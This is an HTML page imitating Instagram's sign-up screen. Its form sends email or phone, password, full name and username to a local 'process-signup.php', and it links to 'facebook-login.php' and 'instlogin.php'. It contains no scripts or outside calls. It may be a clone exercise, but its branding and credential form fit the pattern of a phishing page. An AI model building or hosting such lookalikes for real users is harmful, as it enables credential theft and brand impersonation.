<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 100%;
            max-width: 350px;
        }

        .box {
            background-color: #000;
            border: 1px solid #262626;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .tagline {
            text-align: center;
            color: #a8a8a8;
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 20px;
            line-height: 20px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            background-color: #121212;
            border: 1px solid #262626;
            border-radius: 3px;
            color: #fff;
            font-size: 12px;
            outline: none;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        input:focus {
            border-color: #555;
        }

        .btn {
            width: 100%;
            padding: 8px;
            background-color: #4d91ef;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }

        .btn:hover {
            background-color: #3b7dd6;
        }

        .fb-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
        }

        .fb-icon {
            width: 16px;
            height: 16px;
            background-color: #fff;
            border-radius: 2px;
            display: inline-block;
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0 18px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #262626;
        }

        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .info-text {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 16px;
            margin: 10px 0;
        }

        .info-text a {
            color: #d7dbdf;
            text-decoration: none;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .terms {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 16px;
            margin-bottom: 20px;
        }

        .terms a {
            color: #d7dbdf;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        .login-box {
            background-color: #000;
            border: 1px solid #262626;
            padding: 25px 40px;
            text-align: center;
            font-size: 14px;
        }

        .login-box a {
            color: #4d91ef;
            font-weight: 600;
            text-decoration: none;
        }

        .login-box a:hover {
            color: #3b7dd6;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">Instagram</div>
            
            <div class="tagline">Sign up to see photos and videos from your friends.</div>
            
            <a href="facebook-login.php" class="btn fb-btn">
                <span class="fb-icon"></span>
                Log in with Facebook
            </a>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <form method="POST" action="process-signup.php" style="width: 100%;">
                <input type="text" name="mobile_email" placeholder="Mobile Number or Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="text" name="fullname" placeholder="Full Name" required>
                <input type="text" name="username" placeholder="Username" required>
                
                <div class="info-text">
                    People who use our service may have uploaded your contact information to Instagram. <a href="#">Learn More</a>
                </div>
                
                <div class="terms">
                    By signing up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.
                </div>
                
                <button type="submit" class="btn">Sign up</button>
            </form>
        </div>
        
        <div class="login-box">
            Have an account? <a href="instlogin.php">Log in</a>
        </div>
        
        <div class="get-app">Get the app.</div>
    </div>
</body>
</html>